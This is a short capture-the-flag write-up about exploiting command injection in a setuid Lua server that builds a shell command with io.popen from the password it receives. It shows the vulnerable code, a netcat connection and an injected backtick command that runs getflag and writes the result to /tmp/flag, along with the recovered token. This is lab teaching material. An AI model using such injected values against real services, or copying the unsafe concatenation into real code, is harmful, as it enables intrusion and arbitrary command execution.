## step 1

```
    -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```
Running the script:

```
./level11.lua
lua: ./level11.lua:3: address already in use
```
So it runs a server on 127.0.0.1:5151 (already running in background).
Let's inspect the contents of level11.lua:
```
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  return string.sub(data, 1, 40)
end

```

Unsafe string concatenation exist in the script This allows command injection :
```
io.popen("echo "..pass.." | sha1sum", "r")
```

## step 2

- Connect to the socket
```
nc 127.0.0.1 5151
```
- Inject command
We inject:
```
Password: `getflag` > /tmp/flag
Erf nope..
```

- Retrieve the output

```
cat /tmp/flag

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```